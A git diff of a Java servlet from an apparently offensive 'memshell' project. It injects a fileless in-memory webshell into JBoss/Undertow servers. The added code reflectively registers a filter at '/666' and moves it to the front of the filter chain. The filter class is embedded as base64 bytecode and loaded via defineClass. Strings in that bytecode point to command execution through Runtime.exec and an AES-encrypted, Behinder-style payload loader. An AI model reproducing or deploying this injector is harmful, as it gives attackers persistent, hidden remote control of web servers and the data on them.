@@ -1,110 +1,83 @@
-//package com.memshell.jboss;
-//
-//import io.undertow.servlet.api.DeploymentInfo;
-//import io.undertow.servlet.api.FilterInfo;
-//import io.undertow.servlet.api.FilterMappingInfo;
-//import io.undertow.servlet.core.DeploymentImpl;
-//import io.undertow.servlet.spec.FilterRegistrationImpl;
-//import io.undertow.servlet.spec.HttpServletRequestImpl;
-//import io.undertow.servlet.spec.ServletContextImpl;
-//import io.undertow.servlet.spec.ServletRegistrationImpl;
-//import io.undertow.servlet.util.ConstructorInstanceFactory;
-//import sun.misc.BASE64Decoder;
-//import javax.security.jacc.PolicyContext;
-//import javax.servlet.DispatcherType;
-//import javax.servlet.Filter;
-//import javax.servlet.ServletContext;
-//import javax.servlet.http.HttpServlet;
-//import javax.servlet.http.HttpServletRequest;
-//import javax.servlet.http.HttpServletResponse;
-//import java.lang.reflect.Field;
-//import java.lang.reflect.Method;
-//import java.lang.reflect.Modifier;
-//import java.util.EnumSet;
-//import java.util.List;
-//import java.util.Map;
-//
-//public class FilterBasedWithoutRequest extends HttpServlet {
-//    @Override
-//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
-//        // 参考：
-//        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
-//        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw
-//
-//        try{
-//            String className = "com.memshell.generic.DynamicFilterTemplate";
-//            Class clazz = null;
-//            try {
-//                clazz = Class.forName(className);
-//            } catch (ClassNotFoundException e) {
-//                BASE64Decoder base64Decoder = new BASE64Decoder();
-//                String codeStr = "yv66vgAAADQAMgoABgAhCQAiACMIACQKACUAJgcAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZTsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwAqAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwArAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABpEeW5hbWljRmlsdGVyVGVtcGxhdGUuamF2YQwACAAJBwAsDAAtAC4BAClJJ20gRmlsdGVyIEJhc2VkIE1lbXNoZWxsLCBob3cgZG8geW91IGRvPwcALwwAMAAxAQAqY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAAEAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAABgAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAAA1AAAAAgAAAAGxAAAAAgALAAAABgABAAAACwAMAAAAFgACAAAAAQANAA4AAAAAAAEAEQASAAEAEwAAAAQAAQAUAAEAFQAWAAIACgAAAFUAAgAEAAAACbIAAhIDtgAEsQAAAAIACwAAAAoAAgAAABUACAAWAAwAAAAqAAQAAAAJAA0ADgAAAAAACQAXABgAAQAAAAkAGQAaAAIAAAAJABsAHAADABMAAAAGAAIAHQAUAAEAHgAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAbAAwAAAAMAAEAAAABAA0ADgAAAAEAHwAAAAIAIA==";
-//                Method defineClassMethod = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-//                defineClassMethod.setAccessible(true);
-//                clazz = (Class)defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), base64Decoder.decodeBuffer(codeStr), 0, base64Decoder.decodeBuffer(codeStr).length);
-//            }
-//
-////            public javax.servlet.FilterRegistration.Dynamic addFilter(String filterName, Filter filter) {
-////                this.ensureNotProgramaticListener();
-////                this.ensureNotInitialized();
-////                if (this.deploymentInfo.getFilters().containsKey(filterName)) {
-////                    return null;
-////                } else {
-////                    FilterInfo f = new FilterInfo(filterName, filter.getClass(), new ImmediateInstanceFactory(filter));
-////                    this.deploymentInfo.addFilter(f);
-////                    this.deployment.getFilters().addFilter(f);
-////                    return new FilterRegistrationImpl(f, this.deployment, this);
-////                }
-////            }
-//
-//            FilterInfo filter = new FilterInfo("myFilter", clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
-//            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
-//            ServletContext context = request.getServletContext();
-//            Field f = context.getClass().getDeclaredField("deploymentInfo");
-//            f.setAccessible(true);
-//            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);
-//
-//            //只添加一次
-//            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
-//            if(!filters.containsKey("myFilter")){
-//                System.out.println("Add Dynamic Filter...");
-//                deploymentInfo.addFilter(filter);
-//
-//                f = context.getClass().getDeclaredField("deployment");
-//                f.setAccessible(true);
-//                Field modifiersField = Field.class.getDeclaredField("modifiers");
-//                modifiersField.setAccessible(true);
-//                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
-//                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
-//                deployment.getFilters().addFilter(filter);
-//
-//                FilterRegistrationImpl registration = new FilterRegistrationImpl(filter, deployment, (ServletContextImpl)context);
-//                registration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST),
-//                        true, "/aaa");
-////                针对特定的 Servlet
-////                registration.addMappingForServletNames(EnumSet.of(DispatcherType.REQUEST), true, "test");
-//
-//                //将我们添加的 Filter 移动到 filterChain 的第一位
-//                f = deploymentInfo.getClass().getDeclaredField("filterUrlMappings");
-//                f.setAccessible(true);
-//                modifiersField = Field.class.getDeclaredField("modifiers");
-//                modifiersField.setAccessible(true);
-//                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
-//                List<FilterMappingInfo> filterUrlMappings = (List<FilterMappingInfo>) f.get(deploymentInfo);
-//
-//                for(int i = 0; i < filterUrlMappings.size(); i++){
-//                    if(filterUrlMappings.get(i).getFilterName().equals("myFilter")){
-//                        FilterMappingInfo temp = filterUrlMappings.get(i);
-//                        filterUrlMappings.set(i, filterUrlMappings.get(0));
-//                        filterUrlMappings.set(0, temp);
-//                        break;
-//                    }
-//                }
-//            }
-//        }catch(Exception e){
-//            e.printStackTrace();
-//        }
-//
-//        System.out.println("Done");
-//    }
-//}
+package com.memshell.jboss;
+
+import io.undertow.servlet.api.DeploymentInfo;
+import io.undertow.servlet.api.FilterInfo;
+import io.undertow.servlet.core.DeploymentImpl;
+import io.undertow.servlet.spec.HttpServletRequestImpl;
+import io.undertow.servlet.util.ConstructorInstanceFactory;
+import sun.misc.BASE64Decoder;
+import javax.security.jacc.PolicyContext;
+import javax.servlet.DispatcherType;
+import javax.servlet.Filter;
+import javax.servlet.ServletContext;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
+import java.util.Map;
+
+public class FilterBasedWithoutRequest extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+        // 参考：
+        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
+        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw
+
+        try{
+            String filterName = "jbossFilter";
+            String urlPattern = "/666";
+
+            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
+            ServletContext context = request.getServletContext();
+            Field f = context.getClass().getDeclaredField("deploymentInfo");
+            f.setAccessible(true);
+            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);
+
+            //只添加一次
+            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
+            if(!filters.containsKey(filterName)){
+                System.out.println("[+] Add Dynamic Filter");
+
+                ClassLoader cl = Thread.currentThread().getContextClassLoader();
+                Class clazz;
+                try{
+                    clazz = cl.loadClass("com.memshell.generic.DynamicFilterTemplate");
+                }catch(ClassNotFoundException e){
+                    BASE64Decoder base64Decoder = new BASE64Decoder();
+                    String codeClass = "yv66vgAAADMBUAoAOgCcCACdCQBVAJ4KAFUAnwkAoAChCACiCgCjAKQIAH8LAEAApQgApgoApwCoCgCnAKkHAKoKAKsArAoAqwCtCgCuAK8KAA0AsAgAsQoADQCyCgANALMLAEEAtAoAtQCkCAC2BwC3CgAYAJwIALgKABgAuQoAugC7CgAYALwKABgAvQgAvgoApwC/CgCnAMAHAMELACIAwggAwwsAxADFCgC1AMYIAMcKAMgAyQcAygsAxADLCgCnAMwKACkAzQoAyADOBwDPCgAuAJwLAEAA0AoA0QDSCgAuANMKAMgA1AkAVQDVCADWBwDXBwBxBwDYCgA2ANkHANoKANsA3AoA2wDdCgDeAN8KADYA4AgA4QcA4gcA4wcA5AoAQgDlCwDmAOcIAOgKADgA6QcA6goAOgDrCQDsAO0HAO4KADYA7wgA8AoA3gDxCgDsAPIHAPMKAE8A5QcA9AoAUQDlBwD1CgBTAOUHAPYHAPcBAAhwYXNzd29yZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAPgBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZyZXN1bHQBAANjbWQBAANrZXkBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQAEdHlwZQEADVN0YWNrTWFwVGFibGUHAPkHAOQBAAdkZXN0cm95AQAKaW5pdGlhbGl6ZQEAAmV4AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAFY2xhenoBAAZtZXRob2QBAARjb2RlAQAFYnl0ZXMBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAPYHANgHAOoHANcHAPoHAO4HAPMHAPQHAPUBAApTb3VyY2VGaWxlAQAaRHluYW1pY0ZpbHRlclRlbXBsYXRlLmphdmEMAFsAXAEABHBhc3MMAFcAWAwAhABcBwD7DAD8AP0BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcA/gwA/wBiDAEAAQEBAAViYXNpYwcA+QwA4QECDAEDAQQBABFqYXZhL3V0aWwvU2Nhbm5lcgcBBQwBBgEHDAEIAQkHAQoMAQsBDAwAWwENAQACXEEMAQ4BDwwBEAERDAESARMHARQBAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAEVARYHARcMARgBGQwBFQEaDAEbAREBAAEtDAEcAR0MAR4BHwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMASABIQEAAXUHASIMASMBJAwBJQBiAQADQUVTBwEmDAEnASgBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEpASoMASsBLAwAWwEtDABjAS4BABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEvATAHATEMATIBEQwBMwE0DAE1ATYMAFkAWgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAE3ATgBABBqYXZhL2xhbmcvT2JqZWN0BwE5DAE6ATsMATwBPQcA+gwBPgE/DAFAAUEBAAZlcXVhbHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFCAFwHAUMMAGkBRAEAImNvbS5tZW1zaGVsbC5nZW5lcmljLk15Q2xhc3NMb2FkZXIMAUUBRgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFHAUgHAUkMAUoAWgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAUsBSAEDEHl2NjZ2Z0FBQURNQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNSTVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2pzQkFBRmpBUUFYVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQXRrWldacGJtVkRiR0Z6Y3dFQUxDaGJRa3hxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUZZbmwwWlhNQkFBSmJRZ0VBQzJOc1lYTnpURzloWkdWeUFRQUtVMjkxY21ObFJtbHNaUUVBRWsxNVEyeGhjM05NYjJGa1pYSXVhbUYyWVF3QUJnQUhBUUFpWTI5dEwyMWxiWE5vWld4c0wyZGxibVZ5YVdNdlRYbERiR0Z6YzB4dllXUmxjZ3dBRHdBYUFRQVZhbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNBSVFBQ0FBVUFBQUFBQUFJQUFBQUdBQWNBQVFBSUFBQUFPZ0FDQUFJQUFBQUdLaXUzQUFHeEFBQUFBZ0FKQUFBQUJnQUJBQUFBQkFBS0FBQUFGZ0FDQUFBQUJnQUxBQXdBQUFBQUFBWUFEUUFPQUFFQUNRQVBBQkFBQVFBSUFBQUFSQUFFQUFJQUFBQVF1d0FDV1N1M0FBTXFBeXErdGdBRXNBQUFBQUlBQ1FBQUFBWUFBUUFBQUFnQUNnQUFBQllBQWdBQUFCQUFFUUFTQUFBQUFBQVFBQk1BRGdBQkFBRUFGQUFBQUFJQUZRPT0MAUwBTQwBTgFPAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAKmNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5qYXZhL3V0aWwvVVVJRAEACnJhbmRvbVVVSUQBABIoKUxqYXZhL3V0aWwvVVVJRDsBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAFcHJpbnQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwAhAFUAOgABAFYAAgACAFcAWAAAAAIAWQBaAAAABgABAFsAXAABAF0AAABFAAIAAQAAAA8qtwABKhICtQADKrcABLEAAAACAF4AAAASAAQAAAAUAAQAFQAKABYADgAXAF8AAAAMAAEAAAAPAGAAYQAAAAEAWwBiAAEAXQAAAE4AAgACAAAADiq3AAEqK7UAAyq3AASxAAAAAgBeAAAAEgAEAAAAGgAEABsACQAcAA0AHQBfAAAAFgACAAAADgBgAGEAAAAAAA4AVwBYAAEAAQBjAGQAAgBdAAAANQAAAAIAAAABsQAAAAIAXgAAAAYAAQAAACIAXwAAABYAAgAAAAEAYABhAAAAAAABAGUAZgABAGcAAAAEAAEAaAABAGkAagACAF0AAALKAAcACgAAAZCyAAUSBrYABysSCLkACQIAOgQZBMYAUBkEEgq2AAuZAEYrKrQAA7kACQIAOgUZBcYAMhkFtgAMmgAquwANWbgADhkFtgAPtgAQtwAREhK2ABO2ABQ6Biy5ABUBABkGtgAWpwEuGQTGASEZBBIXtgALmQEXKyq0AAO5AAkCAMYARLsAGFm3ABkSGrYAG7gAHLYAHbYAHhIfEhq2ACAQELYAIToFK8AAIrkAIwEAEiQZBbkAJQMALLkAFQEAGQW2ACaxEie4ACg6BRkFBbsAKVm7ABhZtwAZK8AAIrkAIwEAEiS5ACoCALYAHRIatgAbtgAetgArEie3ACy2AC0ZBbsALlm3AC8ruQAwAQC2ADG2ADK2ADM6Biq0ADQSNQW9ADZZAxI3U1kEEjhTtgA5AQW9ADpZAxkGU1kEuAA7tgA8U7YAPcAANjoHGQe2AD46CBkHEj8FvQA2WQMSQFNZBBJBU7YAOToJGQkZCAW9ADpZAytTWQQsU7YAPVenABU6BRkFtgBDpwALLSssuQBEAwCxAAIAcwDAAX0AQgDBAXoBfQBCAAMAXgAAAGoAGgAAACYACAAoABIAKQAhACoALQArADoALABWAC0AYQAvAHMAMQCAADIAowAzALUANADAADUAwQA4AMgAOQD8ADoBFgA7AUgAPAFPAD0BZgA+AXoAQQF9AD8BfwBAAYQAQQGHAEMBjwBFAF8AAACOAA4AVgALAGsAWAAGAC0ANABsAFgABQCjAB4AbQBYAAUAyACyAG4AbwAFARYAZABwAHEABgFIADIAcgBaAAcBTwArAHMAdAAIAWYAFAB1AHYACQF/AAUAdwB4AAUAAAGQAGAAYQAAAAABkAB5AHoAAQAAAZAAewB8AAIAAAGQAH0AfgADABIBfgB/AFgABACAAAAAFAAG/ABhBwCBAvsAXPcAuwcAggkHAGcAAAAGAAIAUQBoAAEAgwBcAAEAXQAAACsAAAABAAAAAbEAAAACAF4AAAAGAAEAAABKAF8AAAAMAAEAAAABAGAAYQAAAAIAhABcAAEAXQAAAgMABwAHAAAAqbgAO7YAPEwqKxJFtgBGtQA0pwB/TSu2AEhOAToEGQTHADMtEjqlAC0tEjUGvQA2WQMSN1NZBLIASVNZBbIASVO2ADk6BKf/2DoFLbYAS06n/84STDoFuwAuWbcALxkFtgAyOgYZBAS2AE0qGQQrBr0AOlkDGQZTWQQDuABOU1kFGQa+uABOU7YAPcAANrUANKcAGEwrtgBQpwAQTCu2AFKnAAhMK7YAVLEABQAHABEAFABHACgARQBIAEoAAACQAJMATwAAAJAAmwBRAAAAkACjAFMAAwBeAAAAagAaAAAATgAHAFAAEQBgABQAUQAVAFIAGgBTAB0AVAAoAFYARQBZAEgAVwBKAFgATwBZAFIAXABWAF0AZABeAGoAXwCQAGcAkwBhAJQAYgCYAGcAmwBjAJwAZACgAGcAowBlAKQAZgCoAGgAXwAAAHAACwBKAAUAhQCGAAUAGgB2AIcAWgADAB0AcwCIAHYABABWADoAiQBYAAUAZAAsAIoAcQAGABUAewB3AIsAAgAHAIkAjACNAAEAlAAEAHcAjgABAJwABAB3AI8AAQCkAAQAdwCQAAEAAACpAGAAYQAAAIAAAAA6AAn/ABQAAgcAkQcAkgABBwCT/gAIBwCTBwCUBwCVagcAlgn/AD0AAQcAkQAAQgcAl0cHAJhHBwCZBAABAJoAAAACAJs=";
+                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);
+
+                    Method method = null;
+                    Class clz = cl.getClass();
+                    while(method == null && clz != Object.class ){
+                        try{
+                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                        }catch(NoSuchMethodException ex){
+                            clz = clz.getSuperclass();
+                        }
+                    }
+                    method.setAccessible(true);
+                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
+                }
+
+                FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
+                deploymentInfo.addFilter(filter);
+
+                f = context.getClass().getDeclaredField("deployment");
+                f.setAccessible(true);
+                Field modifiersField = Field.class.getDeclaredField("modifiers");
+                modifiersField.setAccessible(true);
+                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
+                deployment.getFilters().addFilter(filter);
+
+                // 0 表示把我们动态注册的 filter 放在第一位
+                deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);
+            }
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
